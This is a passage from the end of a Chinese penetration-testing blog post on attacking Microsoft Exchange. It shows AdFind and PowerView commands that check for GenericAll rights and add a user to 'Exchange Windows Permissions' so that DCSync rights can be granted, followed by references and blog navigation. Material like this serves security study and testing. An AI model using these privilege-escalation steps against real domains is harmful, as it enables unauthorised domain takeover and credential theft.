<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 查看 Organization Management 对 Exchange Windows Permissions 或 Exchange Trusted Subsystem 有 GenericAll 权限</span><br><span class="line">AdFind.exe -h 192.168.60.112 -b &quot;DC=island,DC=com&quot; -f &quot;|(name=Exchange Windows Permissions)(name=Exchange Trusted Subsystem)&quot; nTSecurityDescriptor -nosacl -sddl+++ -sddlfilter A;;FC;;;&quot;Organization Management&quot; -recmute</span><br><span class="line"></span><br><span class="line"># PowerView.ps1</span><br><span class="line"># 通过 Organization Management 组成员将任意用户添加至 Exchange Windows Permissions 或 Exchange Trusted Subsystem</span><br><span class="line"># 当然，也可以将该组成员自身添加至 Exchange Windows Permissions 或 Exchange Trusted Subsystem</span><br><span class="line"># Add-DomainGroupMember 不支持域外指定域控</span><br><span class="line">Add-DomainGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members &quot;zhangsan&quot; -Verbose</span><br><span class="line">Get-DomainGroupMember -DomainController 192.168.60.112 -Domain island.com -Identity &quot;Exchange Windows Permissions&quot; -Recurse -Verbose</span><br><span class="line">Remove-DomainGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members &quot;zhangsan&quot; -Verbose</span><br><span class="line"></span><br><span class="line"># 之后就跟 Exchange 机器账户利用方式一样，zhangsan 可以给别人添加 Dcsync 权限，不再赘述</span><br></pre></td></tr></table></figure>

<h1 id="四、Relay"><a href="#四、Relay" class="headerlink" title="四、Relay"></a>四、Relay</h1><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a target="_blank" rel="noopener" href="https://rivers.chaitin.cn/blog/cq94vbh0lnechd244d3g">https://rivers.chaitin.cn/blog/cq94vbh0lnechd244d3g</a></li>
<li>ChatGPT</li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yokan/p/14883183.html">https://www.cnblogs.com/yokan/p/14883183.html</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://starven-l.github.io">Starven</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://starven-l.github.io/2025/07/14/Exchange-%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/">https://starven-l.github.io/2025/07/14/Exchange-%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://starven-l.github.io" target="_blank">Starven's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a></div><div class="post-share"><div class="social-share" data-image="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/16/NTLM-Relay-Attack%E7%9A%84%E8%A1%A5%E4%B8%81%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93-By-Starven/" title="NTLM Relay Attack的补丁及其攻击绕过总结-By.Starven"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">NTLM Relay Attack的补丁及其攻击绕过总结-By.Starven</div></div><div class="info-2"><div class="info-item-1">我们都知道获取Net NTLM hash之后的攻击向量存在hashcat爆破和NTLM relay这两个攻击手法 前者基本李用不了，而后者才是利用重点，但是呢各种协议的relay又历经修复补丁与新的绕过CVE 我始终觉得脑子里面装的学的有点乱，因此来写一篇文章总结一下，感觉还是挺不好完整梳 relay to SMB这个应该是最近最热门了的吧 我们知道最开始微软发布的补丁已经把这条路封死了，**CVE-2019-1384也过去了多年，**但是就上个月爆出的CVE-2025-33073可以对其进行绕过使得NTLM Relay再次成为热点话题 MS08-068【最早的中继攻击relay to SMB】：不多说 kb957097补丁【修复MS08-068也就是relay to smb】：增加了一些机制防止SMB客户端将NTLM认证请求转发到自身或其他SMB服务 12345671. 仅允许来自本地的 NTLM challenge-response，限制了SMB反射回自身（也就是说攻击者伪装的SMB服务返回的challenge-response会被拒绝接受）2. 验证SPN（防止凭据重播）防...</div></div></div></a><a class="pagination-related" href="/2025/07/14/MCP%E5%A4%A7%E6%A8%A1%E5%9E%8B%E4%B8%8A%E4%B8%8B%E6%96%87%E5%8D%8F%E8%AE%AE/" title="MCP大模型上下文协议"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">MCP大模型上下文协议</div></div><div class="info-2"><div class="info-item-1">本文仅是对原文的阅读理解与自己处理后的cv浓缩 一、什么是Model Context Protocol1. 初识MCP及其价值2024年11月底，由 Anthropic 推出的一种开放标准，旨在统一大模型与外部数据源和工具之间的通信协议 MCP 的主要目的在于解决当前 AI 模型因数据孤岛限制而无法充分发挥潜力的难题，MCP 使得 AI 应用能够安全地访问和操作本地及远程数据 MCP的价值：显而易见，对比一下就很清晰了 123在过去，为了让大模型等 AI 应用使用数据，要么复制粘贴，要么上传知识库，非常局限现在 MCP 可以直接在 AI 与数据（包括本地数据和互联网数据）之间架起一座桥梁，通过 MCP 服务器和 MCP 客户端  因此有了MCP，可以和数据和文件系统、开发工具、Web 和浏览器自动化、生产力和通信、各种社区生态能力全部集成，实现强大的协作工作能力，它的价值远不可估量。 因此也就可以随之诞生AI Agent 2. MCP核心架构原文先讲的数据安全性和工作原理，但是我认为先学习MCP核心架构较为合适，因此这部分内容前置到这里了 MCP也是C&#x2F;S架构，有以下核...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/06/20/CVE-2025-33073%E8%BF%91%E6%9C%9F%E7%83%AD%E9%97%A8%E6%BC%8F%E6%B4%9E%E6%B5%85%E8%B0%88-%E5%9F%9F%E5%86%85%E5%A4%A7%E6%9D%80%E5%99%A8-NTLMrelay%E5%86%8D%E6%B7%BB%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F/" title="CVE-2025-33073近期热门漏洞浅谈-域内大杀器-NTLMrelay再添攻击向量"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-20</div><div class="info-item-2">CVE-2025-33073近期热门漏洞浅谈-域内大杀器-NTLMrelay再添攻击向量</div></div><div class="info-2"><div class="info-item-1">漏洞背景在 MS08-068 修复后，我们知道微软采取了一些机制防止 SMB 客户端将 NTLM 身份验证请求回发到自己或其他 SMB 服务中（SMB → SMB） 1231.增加了 NTLM 中继限制2.引入 NTLM Message Signing3.使用 SPN 检查 验证请求目的地是否正确  而为什么说NTLM Relay复活呢就是这个原因，CVE-2025-33073是James Forshaw披露的，他发现可以通过绕过来实现relay SMB to SMB 漏洞介绍与危害微软这次爆的这个洞呢是NTLM 反射攻击，也是给NTLM Relay攻击再添加了一种攻击手段 简单一句话概述危害吧：攻击者只要拿到了普通域用户的凭据，就可以远程获取域内非域控主机的最高权限，从而实现快速的横向移动扩散危害整个企业内部网络 而一般除了域控默认开启SMB签名，其他域成员机基本不开启，所以说危害是极高的 这个洞爆出来一周由于最近考试繁多一直没来得及复现，还是得挤一下时间复现 漏洞利用条件 任意域用户的条件 目标机器未开启SMB签名  攻击路径与域环境情况1234567域：root.com域控...</div></div></div></a><a class="pagination-related" href="/2025/07/16/NTLM-Relay-Attack%E7%9A%84%E8%A1%A5%E4%B8%81%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93-By-Starven/" title="NTLM Relay Attack的补丁及其攻击绕过总结-By.Starven"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-16</div><div class="info-item-2">NTLM Relay Attack的补丁及其攻击绕过总结-By.Starven</div></div><div class="info-2"><div class="info-item-1">我们都知道获取Net NTLM hash之后的攻击向量存在hashcat爆破和NTLM relay这两个攻击手法 前者基本李用不了，而后者才是利用重点，但是呢各种协议的relay又历经修复补丁与新的绕过CVE 我始终觉得脑子里面装的学的有点乱，因此来写一篇文章总结一下，感觉还是挺不好完整梳 relay to SMB这个应该是最近最热门了的吧 我们知道最开始微软发布的补丁已经把这条路封死了，**CVE-2019-1384也过去了多年，**但是就上个月爆出的CVE-2025-33073可以对其进行绕过使得NTLM Relay再次成为热点话题 MS08-068【最早的中继攻击relay to SMB】：不多说 kb957097补丁【修复MS08-068也就是relay to smb】：增加了一些机制防止SMB客户端将NTLM认证请求转发到自身或其他SMB服务 12345671. 仅允许来自本地的 NTLM challenge-response，限制了SMB反射回自身（也就是说攻击者伪装的SMB服务返回的challenge-response会被拒绝接受）2. 验证SPN（防止凭据重播）防...</div></div></div></a><a class="pagination-related" href="/2025/08/10/NoPAC%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E6%88%98%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-By-Starven/" title="NoPAC域内提权漏洞 - 原理分析与实战最佳实践 - By.Starven"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-10</div><div class="info-item-2">NoPAC域内提权漏洞 - 原理分析与实战最佳实践 - By.Starven</div></div><div class="info-2"><div class="info-item-1">最近在打某项目的跨vlan渗透的时候，第二个vlan段有一个域环境，当时接管全域拿下域控就是通过NoPAC打的，拿下第二个vlan段的域控之后通过横向到其他域成员机抓rdp凭据才打到第三个vlan段 回想最初学域渗透的时候，实话实说当时并没有太实操过这个洞，只大概了解原理，既然都用到了，还是再深入复现一下吧 最初学的时候也抓过分析过kerberos的流量，缘由是在于我对这些是有掌握和了解的，因此这里在流量层面就不再赘述 因此建议初学者：  对流量层面进行分析 S4U2Self为什么可以重新生成PAC的原理进行分析  因此本文我把重心放在两个问题：也当是一个复习了  如何让KDC找不到UserName？【有两种方法，一种是跨域，一种就是我们本文用的修改sAMAccountName属性】 如何让KDC在TGS-REP里面用的PAC重新生成而不是拷贝TGT的PAC【也有两种方法，一种还是跨域，另一种就是我们本文用的使用S4U2Self协议去请求】  Referencehttps://forum.butian.net/share/2408 https://mp.weixin.qq.com...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Starven</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Starven-L" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="tencent://message/?uin=1732293304&amp;Site=&amp;Menu=yes" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F"><span class="toc-number">1.</span> <span class="toc-text">攻击向量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%97%A0%E4%BB%BB%E4%BD%95%E6%9D%83%E9%99%90%E7%9A%84%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F"><span class="toc-number">2.</span> <span class="toc-text">一、无任何权限的攻击向量</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%8E%A2%E6%B5%8B%E5%8F%91%E7%8E%B0Exchange%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.1.</span> <span class="toc-text">1. 探测发现Exchange邮件服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%89%88%E6%9C%AC%E5%88%A4%E5%AE%9A"><span class="toc-number">2.2.</span> <span class="toc-text">2. 版本判定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%88%86%E7%A0%B4%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7"><span class="toc-number">2.3.</span> <span class="toc-text">3. 爆破邮箱账户</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E8%8E%B7%E5%8F%96AD%E5%9F%9F%E5%90%8D"><span class="toc-number">2.3.1.</span> <span class="toc-text">（1）获取AD域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E7%94%A8%E6%88%B7%E5%90%8D%E7%88%86%E7%A0%B4"><span class="toc-number">2.3.2.</span> <span class="toc-text">（2）用户名爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">2.3.3.</span> <span class="toc-text">（3）密码喷洒</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%9C%89%E6%99%AE%E9%80%9A%E9%82%AE%E7%AE%B1%E8%B4%A6%E6%88%B7%E6%9D%83%E9%99%90%E7%9A%84%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F"><span class="toc-number">3.</span> <span class="toc-text">二、有普通邮箱账户权限的攻击向量</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96%E5%85%A8%E9%83%A8%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80"><span class="toc-number">3.1.</span> <span class="toc-text">1. 获取全部邮箱地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96%E8%87%AA%E8%BA%AB%E9%82%AE%E7%AE%B1%E9%82%AE%E4%BB%B6"><span class="toc-number">3.2.</span> <span class="toc-text">2. 获取自身邮箱邮件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%90%9C%E7%B4%A2%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF"><span class="toc-number">3.3.</span> <span class="toc-text">3. 搜索域内信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%BB%A5%E7%94%A8outlook%E5%8A%9F%E8%83%BD%E6%94%BB%E5%87%BBPC"><span class="toc-number">3.4.</span> <span class="toc-text">4. 滥用outlook功能攻击PC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89Rules"><span class="toc-number">3.4.1.</span> <span class="toc-text">（1）Rules</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89Forms"><span class="toc-number">3.4.2.</span> <span class="toc-text">（2）Forms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89-Homepage"><span class="toc-number">3.4.3.</span> <span class="toc-text">（3） Homepage</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%8B%A5%E6%9C%89%E9%AB%98%E6%9D%83%E9%99%90%E8%B4%A6%E6%88%B7"><span class="toc-number">4.</span> <span class="toc-text">三、拥有高权限账户</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%AE%A1%E7%90%86Exchange"><span class="toc-number">4.1.</span> <span class="toc-text">1. 管理Exchange</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%A6%82%E6%9E%9C%E5%B7%B2%E6%9C%89%E9%AB%98%E6%9D%83%E9%99%90%E5%9F%9F%E8%B4%A6%E5%8F%B7"><span class="toc-number">4.1.1.</span> <span class="toc-text">(1)如果已有高权限域账号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A6%82%E6%9E%9C%E5%B7%B2%E6%9C%89Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90"><span class="toc-number">4.1.2.</span> <span class="toc-text">(2)如果已有Exchange服务器权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%AF%AD%E6%B3%95%E6%89%80%E9%9C%80%E6%9D%83%E9%99%90"><span class="toc-number">4.1.3.</span> <span class="toc-text">(3)语法所需权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%BB%9F%E8%AE%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">4.1.4.</span> <span class="toc-text">(4)统计信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2"><span class="toc-number">4.1.5.</span> <span class="toc-text">(5)全局搜索</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E5%9F%9F%E7%AE%A1"><span class="toc-number">4.2.</span> <span class="toc-text">2. 攻击域管</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89-%E5%B7%B2%E6%9C%89Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90"><span class="toc-number">4.2.1.</span> <span class="toc-text">（1） 已有Exchange服务器权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%B7%B2%E6%9C%89%E9%AB%98%E6%9D%83%E9%99%90%E5%9F%9F%E8%B4%A6%E5%8F%B7"><span class="toc-number">4.2.2.</span> <span class="toc-text">（2）已有高权限域账号</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Relay"><span class="toc-number">5.</span> <span class="toc-text">四、Relay</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">6.</span> <span class="toc-text">Reference</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/10/NoPAC%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E6%88%98%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-By-Starven/" title="NoPAC域内提权漏洞 - 原理分析与实战最佳实践 - By.Starven">NoPAC域内提权漏洞 - 原理分析与实战最佳实践 - By.Starven</a><time datetime="2025-08-10T14:40:06.000Z" title="发表于 2025-08-10 22:40:06">2025-08-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/16/NTLM-Relay-Attack%E7%9A%84%E8%A1%A5%E4%B8%81%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93-By-Starven/" title="NTLM Relay Attack的补丁及其攻击绕过总结-By.Starven">NTLM Relay Attack的补丁及其攻击绕过总结-By.Starven</a><time datetime="2025-07-16T06:31:39.000Z" title="发表于 2025-07-16 14:31:39">2025-07-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/14/Exchange-%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/" title="Exchange 攻击专题">Exchange 攻击专题</a><time datetime="2025-07-14T15:39:37.000Z" title="发表于 2025-07-14 23:39:37">2025-07-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/14/MCP%E5%A4%A7%E6%A8%A1%E5%9E%8B%E4%B8%8A%E4%B8%8B%E6%96%87%E5%8D%8F%E8%AE%AE/" title="MCP大模型上下文协议">MCP大模型上下文协议</a><time datetime="2025-07-14T14:44:49.000Z" title="发表于 2025-07-14 22:44:49">2025-07-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/10/EKS-Cluster-Games-Summary/" title="EKS Cluster Games - Summary">EKS Cluster Games - Summary</a><time datetime="2025-07-10T03:37:11.000Z" title="发表于 2025-07-10 11:37:11">2025-07-10</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Starven</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>